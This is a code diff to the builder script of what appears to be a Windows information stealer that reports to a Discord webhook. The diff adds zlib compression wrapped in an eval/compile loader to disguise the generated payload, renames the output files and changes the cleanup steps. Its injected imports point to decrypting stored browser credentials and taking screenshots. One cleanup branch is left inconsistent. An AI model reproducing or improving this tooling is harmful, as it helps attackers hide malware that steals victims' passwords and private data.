@@ -5,10 +5,12 @@ import shutil
 import subprocess
 import time
 import sys
+
 from json import load
 from urllib.request import urlopen
 from alive_progress import alive_bar
 from colorama import Fore, Style, init
+from zlib import compress
 
 class Builder:
     def __init__(self) -> None:
@@ -51,14 +53,6 @@ class Builder:
         else:
             self.error = False
 
-        self.hide = input(
-            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Hide console? (y/n): ')
-
-        if self.hide.lower() == 'y':
-            self.hide = True
-        else:
-            self.hide = False
-
         self.obfuscation = input(
             f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to obfuscate the file? (y/n): ')
 
@@ -67,12 +61,13 @@ class Builder:
 
         self.mk_file(self.filename, self.webhook)
 
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Built!{Fore.RESET}')
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} File successfully created!{Fore.RESET}')
 
         self.cleanup(self.filename)
+        self.renamefile(self.filename)
 
         run = input(
-            f'\n\n\n{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to test run the file? [y/n]: ')
+            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to test the file? [y/n]: ')
         if run.lower() == 'y':
             self.run(self.filename)
 
@@ -184,6 +179,20 @@ class Builder:
         os.system('mode con:cols=150 lines=20')
 
         return True
+    
+    def renamefile(self, filename):
+        try:
+            os.rename(f"./obfuscated_compressed_{filename}.py", f"./{filename}.py")
+        except Exception:
+            pass
+        try:
+            os.rename(f"./compressed_{filename}.py", f"./{filename}.py")
+        except Exception:
+            pass
+        try:
+            os.rename(f"./obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
+        except Exception:
+            pass
 
     def mk_file(self, filename, webhook):
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')
@@ -201,18 +210,36 @@ class Builder:
         time.sleep(2)
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')
 
+        with open(f"{filename}.py", mode='rb') as f:
+            content = f.read()
+
+        print(f"{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Compressing Code...{Fore.RESET}")
+
+        original_size = len(content)
+        content = self.compress(content)
+        new_size = len(content)
+
+        with open(file='compressed_' + (filename.split('\\')[-1] if '\\' in filename else filename.split('/')[-1]) + '.py', mode='w', encoding='utf-8') as f:
+            f.write(content)
+
+        print(f"{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Old file size: {original_size} bytes - New file size: {new_size} bytes {Fore.RESET}")
+
         if self.obfuscation == 'y' and self.compy == 'y':
-            self.encryption(filename)
-            self.compile(f"obfuscated_{filename}")
+            self.encryption(f"compressed_{filename}")
+            self.compile(f"obfuscated_compressed_{filename}")
         elif self.obfuscation == 'n' and self.compy == 'y':
-            self.compile(filename)
+            self.compile(f"compressed_{filename}")
         elif self.obfuscation == 'y' and self.compy == 'n':
-            self.encryption(filename)
+            self.encryption(f"compressed_{filename}")
         else:
             pass
 
+    def compress(self, content):
+        compressed_code = compress(content)
+        return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='auoiwhgoawhg',mode='exec'))"
+
     def encryption(self, filename):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Obfuscating code...{Fore.RESET}')
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')
 
         imports = "\nimport os, platform, re, threading, uuid, requests, wmi, subprocess, sqlite3, psutil, json, base64, ctypes;from tkinter import messagebox;from shutil import copy2;from zipfile import ZipFile;from Crypto.Cipher import AES;from discord import Embed, File, SyncWebhook;from PIL import ImageGrab;from win32crypt import CryptUnprotectData"
         
@@ -235,13 +262,12 @@ class Builder:
     
     def cleanup(self, filename):
         cleans_dir = {'./__pycache__', './build'}
-        cleans_file = {f'./{filename}.spec', f'./{filename}.py', f'./obfuscated_{filename}.py'}
+        cleans_file = {f'./{filename}.py', f'./obfuscated_compressed_{filename}.py', f'./compressed_{filename}.py'}
 
         if self.obfuscation == 'y' and self.compy == 'n':
             cleans_file.remove(f'./obfuscated_{filename}.py')
         elif self.obfuscation == 'y' and self.compy == 'y':
-            cleans_file.remove(f'./{filename}.spec')
-            cleans_file.add(f'./obfuscated_{filename}.spec')
+            cleans_file.add(f'./obfuscated_compressed_{filename}.spec')
         elif self.obfuscation == 'n' and self.compy == 'n':
             cleans_file.remove(f'./{filename}.py')
         else:
